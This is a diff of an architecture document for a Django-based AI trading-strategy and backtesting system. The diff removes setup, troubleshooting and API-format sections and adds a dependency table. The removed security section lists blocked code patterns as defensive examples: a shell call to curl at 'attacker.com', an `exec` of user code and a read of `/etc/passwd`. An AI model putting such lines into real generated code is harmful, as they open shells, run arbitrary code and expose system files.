-# Collect static files
-python manage.py collectstatic --noinput
-
-# Start Django server
-python manage.py runserver 0.0.0.0:8000
-```
-
-**Manual Startup:**
-```bash
-# Activate environment
-.venv\Scripts\activate
-
-# Run migrations
-python manage.py migrate
-
-# Start server
-python manage.py runserver
-```
-
-**Server Endpoints:**
-- Django REST API: `http://localhost:8000/api/`
-- Admin: `http://localhost:8000/admin/`
-- Swagger Docs: `http://localhost:8000/api/docs/` (if configured)
-
----
-
-## K — Security & Safety Features
-
-### K.1 — Production Endpoints
-
-All production endpoints include:
-- ✅ **Schema Validation** - Pydantic type checking
-- ✅ **Code Safety Validation** - Scans for dangerous patterns:
-  - `os.system`, `subprocess`, `eval`, `exec`
-  - File system writes outside safe directories
-  - Network calls in strategy code
-- ✅ **Sandbox Execution** - Docker container isolation (optional)
-- ✅ **State Tracking** - StateManager for versioning
-- ✅ **Git Integration** - Automatic commit & tag (optional)
-
-### K.2 — Data Security
-
-- Credentials from environment variables (never in code)
-- Gemini API key from `.env` file
-- Database backups supported
-- User authentication via JWT tokens
-
-### K.3 — Code Safety
-
-**Dangerous patterns detected:**
-```python
-# ❌ NOT ALLOWED
-import os; os.system("curl attacker.com")  # Shell injection
-exec("user_code")                           # Arbitrary code execution
-open("/etc/passwd").read()                  # Filesystem access
-```
-
-**Safe patterns:**
-```python
-# ✅ ALLOWED
-df['Close'].rolling(20).mean()              # Pandas operations
-order = broker.place_order(...)             # Broker API
-print(f"PnL: {result}")                     # Logging
-```
-
----
-
-## L — Known Issues & Limitations
-
-### Current Status: ✅ OPERATIONAL
-
-**What's Working:**
-- ✅ Strategy validation & canonical JSON schema
-- ✅ AI code generation (backtesting.py)
-- ✅ Backtesting execution & metrics
-- ✅ Data fetching (yfinance)
-- ✅ REST API endpoints
-- ✅ Authentication (JWT)
-- ✅ Conversation memory
-- ✅ Test suite (26+ tests passing)
-
-**What Needs Work:**
-- 🔶 Live trading adapter (placeholder - not production-ready)
-- 🔶 Real-time data streaming (backtesting only)
-- 🔶 Multi-timeframe analysis (single timeframe supported)
-- 🔶 Portfolio optimization (single strategy only)
-
----
-
-## M — Quick Start Commands
-
-### Start Django Server
-```bash
-# Activate environment
-.venv\Scripts\activate
-
-# Run migrations
-python manage.py migrate
-
-# Start server
-python manage.py runserver
-```
-
-### Test Strategy Interactively
-```bash
-cd Strategy
-python interactive_strategy_tester.py
-```
-
-### Run All Tests
-```bash
-pytest tests/ -v
-```
-
-### Generate Strategy Code
-```bash
-# Via API
-curl -X POST http://localhost:8000/api/strategies/1/generate-code/ \
-  -H "Authorization: Bearer YOUR_TOKEN" \
-  -d "{...canonical_json...}"
-```
-
-### Run Backtest
-```bash
-# Via API
-curl -X POST http://localhost:8000/api/backtests/quick-run/ \
-  -H "Authorization: Bearer YOUR_TOKEN" \
-  -d "{\"strategy_id\": 1, \"start_date\": \"2024-01-01\"}"
-```
-
----
-
-## N — API Response Formats
-
-### Successful Strategy Creation
-```json
-{
-  "id": 123,
-  "name": "RSI_Oversold_AAPL",
-  "user_id": 1,
-  "canonical_json": {
-    "strategy_name": "RSI Oversold",
-    "entry_rules": [...],
-    "exit_rules": [...],
-    "indicators": [{"name": "RSI", "timeperiod": 14}]
-  },
-  "generated_code": "import backtesting...",
-  "code_path": "Backtest/codes/rsi_oversold_aapl.py",
-  "created_at": "2025-12-03T10:30:00Z",
-  "updated_at": "2025-12-03T10:30:00Z"
-}
-```
-
-### Successful Backtest Run
-```json
-{
-  "id": 456,
-  "strategy_id": 123,
-  "status": "completed",
-  "total_pnl": 2500.50,
-  "win_rate": 0.62,
-  "max_drawdown": -8.3,
-  "sharpe_ratio": 1.45,
-  "total_trades": 42,
-  "trades_csv": "artifacts/trades_456.csv",
-  "equity_csv": "artifacts/equity_456.csv",
-  "created_at": "2025-12-03T10:35:00Z"
-}
-```
-
-### Validation Error
-```json
-{
-  "error": "Strategy validation failed",
-  "details": [
-    {
-      "field": "entry_rules",
-      "message": "RSI threshold must be between 0 and 100",
-      "suggestion": "Use RSI_value < 30 for oversold condition"
-    }
-  ],
-  "ai_suggestions": [
-    "Add a timeframe specification",
-    "Specify position sizing rule",
-    "Add a cooldown between trades"
-  ]
-}
-```
-
----
-
-## O — Troubleshooting
-
-### Issue: "Gemini API key not found"
-**Solution:** Add `GEMINI_API_KEY=...` to `.env` file
-
-### Issue: "UNIQUE constraint failed: strategy_api_strategy.name"
-**Solution:** Strategy names must be unique per user. Add version suffix: `RSI_v1`, `RSI_v2`
-
-### Issue: "ModuleNotFoundError: No module named 'backtesting'"
-**Solution:** Install with `pip install -r requirements.txt`
-
-### Issue: "No trades generated"
-**Solution:** 
-- Verify entry/exit conditions are correct
-- Check indicator values in debug logs
-- Ensure sufficient lookback period (e.g., RSI needs 14+ bars)
-
----
-
-## P — Future Roadmap
-
-- [ ] Live trading adapter for MT5 / Interactive Brokers
-- [ ] Real-time data streaming via WebSocket
-- [ ] Multi-timeframe analysis
-- [ ] Portfolio optimization & correlation analysis
-- [ ] Risk metrics (Sortino, Calmar, etc.)
-- [ ] Strategy parameter optimization
-- [ ] Backtesting visualization (interactive charts)
-- [ ] REST API versioning (v2, v3)
-
----
-
-**END OF ARCHITECTURE SPECIFICATION**
-
-This is the authoritative reference for the monolithic AlgoAgent system. Use this document for understanding system design, API contracts, and module responsibilities.
+## 10. Dependency Summary
+
+| Package | Version | Purpose |
+|---------|---------|---------|
+| Django | >=4.2, <5.0 | Web framework |
+| djangorestframework | >=3.14 | REST API |
+| djangorestframework-simplejwt | >=5.3 | JWT auth |
+| django-allauth | >=0.57 | Google OAuth |
+| django-cors-headers | >=4.3 | CORS |
+| channels | >=4.0 | WebSockets |
+| daphne | >=4.0 | ASGI server |
+| celery | >=5.3 | Task queue |
+| redis | >=5.0 | Celery broker |
+| django-celery-results | >=2.5 | Task result storage |
+| psycopg2-binary | >=2.9 | PostgreSQL driver |
+| google-generativeai | >=0.3 | Gemini LLM |
+| langchain | >=0.1 | LLM orchestration |
+| backtesting | — | Backtesting engine |
+| pandas | >=2.1 | Data analysis |
+| numpy | >=1.26 | Numerical computing |
